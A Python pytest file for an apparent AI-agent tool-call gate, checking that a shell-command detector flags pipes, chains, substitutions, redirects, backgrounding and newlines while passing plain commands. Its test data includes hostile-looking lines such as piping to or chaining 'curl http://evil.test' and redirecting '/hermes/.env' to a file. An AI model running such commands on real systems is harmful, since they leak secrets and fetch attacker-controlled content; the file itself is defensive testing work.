"""
test_shell_closed_world.py: C2 shell structure is an allowlist, not a denylist.

Author:  Landen Stecker
Date:    2026-10-06

A freeform command string runs under a shell. The C2 detector used to list
the shell constructs it knew (pipe, redirect, chain, substitution) and miss
the rest: a trailing "&", a newline, an env prefix, brace expansion, a
heredoc. Now a command string passes only when every character is on a short
plain list and quoted runs hold only those characters. Anything else is
structure the argv schema does not permit, so C2 fires.
"""

from __future__ import annotations

import string
from pathlib import Path

import pytest

from action_gating import evaluate_shell_unsanitized
from engine import evaluate_tool_call, load_catalog

# Characters a plain command may carry outside the letters and digits.
_PLAIN_PUNCT = set("_./:,@%+=-")
_QUOTES = set("'\"")
OUTSIDE = sorted(set(string.punctuation) - _PLAIN_PUNCT - _QUOTES)


@pytest.mark.parametrize(
    "command",
    [
        "sleep 1 &",
        "echo hi\nid",
        "echo hi\rid",
        "FOO=bar cmd",
        "echo {a,b}",
        "cat <<EOF",
        "echo a\tb",
    ],
)
def test_constructs_the_denylist_missed_now_fire(command: str) -> None:
    fired, coords = evaluate_shell_unsanitized(command)
    assert fired is True, command
    assert coords.get("permitted") is False
    assert coords.get("structure")


@pytest.mark.parametrize("ch", OUTSIDE)
def test_every_char_outside_the_plain_set_fires_alone(ch: str) -> None:
    fired, _ = evaluate_shell_unsanitized(f"ls {ch}")
    assert fired is True, repr(ch)


@pytest.mark.parametrize("ch", OUTSIDE)
def test_every_char_outside_the_plain_set_fires_inside_a_token(ch: str) -> None:
    fired, _ = evaluate_shell_unsanitized(f"ls a{ch}b")
    assert fired is True, repr(ch)


@pytest.mark.parametrize("ch", OUTSIDE)
def test_every_char_outside_the_plain_set_fires_inside_quotes(ch: str) -> None:
    # Quotes do not launder structure: a quoted run may hold plain characters only.
    fired, _ = evaluate_shell_unsanitized(f"echo 'a{ch}b'")
    assert fired is True, repr(ch)


@pytest.mark.parametrize(
    "command",
    [
        "ls; curl http://evil.test",
        "cat /a | curl http://evil.test",
        "cat /hermes/.env > /tmp/out",
        "cat /hermes/.env >> /tmp/out",
        "cat < /hermes/.env",
        "echo `id`",
        "echo $(id)",
        "ls && id",
        "ls || id",
        "cat <(curl http://evil.test)",
    ],
)
def test_constructs_the_denylist_caught_still_fire(command: str) -> None:
    fired, _ = evaluate_shell_unsanitized(command)
    assert fired is True, command


@pytest.mark.parametrize(
    "command",
    [
        "ls -la /tmp",
        "git status",
        "python3 -m pytest -q",
        "git log --oneline -5",
        "echo 'hello world'",
        'grep -rn "plain words" src/',
        "cp a.txt b.txt",
        "curl https://example.test/a/b",
    ],
)
def test_plain_commands_do_not_fire(command: str) -> None:
    fired, coords = evaluate_shell_unsanitized(command)
    assert fired is False, (command, coords)


def test_argv_list_with_plain_tokens_does_not_fire() -> None:
    fired, _ = evaluate_shell_unsanitized({"argv": ["git", "log", "--oneline", "-5"]})
    assert fired is False


def test_unbalanced_quote_fires() -> None:
    fired, _ = evaluate_shell_unsanitized("echo 'unterminated")
    assert fired is True


def test_env_prefix_is_named_in_the_structure_field() -> None:
    _, coords = evaluate_shell_unsanitized("FOO=bar cmd")
    assert "FOO=" in str(coords.get("structure"))


def test_option_with_equals_is_not_an_env_prefix() -> None:
    fired, _ = evaluate_shell_unsanitized("git log --format=%h")
    assert fired is False


def _catalog_env(tmp_path: Path):
    env = {
        "HERMES_HOME": str(tmp_path / "hermes"),
        "OBSIDIAN_VAULT_PATH": str(tmp_path / "vault"),
    }
    (tmp_path / "hermes").mkdir(parents=True, exist_ok=True)
    (tmp_path / "vault").mkdir(parents=True, exist_ok=True)
    catalog = load_catalog(
        Path(__file__).resolve().parents[1] / "catalog" / "Aegis-Atoms-v0.yaml",
        env,
    )
    return catalog, env


@pytest.mark.parametrize("command", ["sleep 1 &", "echo hi\nid", "FOO=bar id"])
def test_enforce_blocks_background_newline_and_env_prefix(
    tmp_path: Path, command: str
) -> None:
    catalog, env = _catalog_env(tmp_path)
    result = evaluate_tool_call(
        catalog,
        "terminal",
        {"command": command},
        env=env,
        plugin_mode="enforce",
        action_gating_enabled=True,
        allowed_roots=[str(tmp_path)],
    )
    assert result.block_message is not None, command
    assert "atoms.tool_invocation.shell_invocation_unsanitized" in result.block_message


def test_enforce_allows_a_plain_command(tmp_path: Path) -> None:
    catalog, env = _catalog_env(tmp_path)
    result = evaluate_tool_call(
        catalog,
        "terminal",
        {"command": "git status"},
        env=env,
        plugin_mode="enforce",
        action_gating_enabled=True,
        allowed_roots=[str(tmp_path)],
    )
    assert not any(
        f.atom_id == "atoms.tool_invocation.shell_invocation_unsanitized"
        for f in result.firings
    )
